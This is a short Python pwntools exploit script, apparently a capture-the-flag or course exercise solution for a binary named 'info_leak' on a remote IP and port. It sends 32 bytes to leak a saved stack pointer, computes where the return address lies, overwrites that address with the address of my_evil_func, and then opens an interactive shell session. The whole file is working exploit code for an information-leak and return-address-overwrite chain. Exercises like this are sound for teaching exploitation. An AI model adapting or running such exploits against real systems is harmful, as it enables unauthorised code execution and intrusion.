#!/usr/bin/env python

from pwn import *

binary = "./info_leak"

context.binary = binary
# io = process(binary)
io = remote('141.85.224.157', 31339)
elf = ELF(binary)

# Determine my_evil_func address:
#    nm info_leak | grep ' my_evil_func'
evil_func_address = elf.symbols['my_evil_func']

# Send 32 bytes to trigger leak. Extract leaked information.
io.send(32*b"A")
out = io.recvline()
print(out)

# From the output string (from the `out' variable) extract the leak.
old_rbp = u64(out[38:44] + b'\x00\x00')
log.info("old_rbp is 0x{:08x}".format(old_rbp))
ret_address_address = old_rbp - 8
log.info("return address is located at is 0x{:08x}".format(ret_address_address))

# Overwrite return address with address of my_evil_func. The program
# issues two read() calls.
io.send(p64(ret_address_address))
io.wait(1)
io.send(p64(evil_func_address))

# Interactive and shell :)
io.interactive()
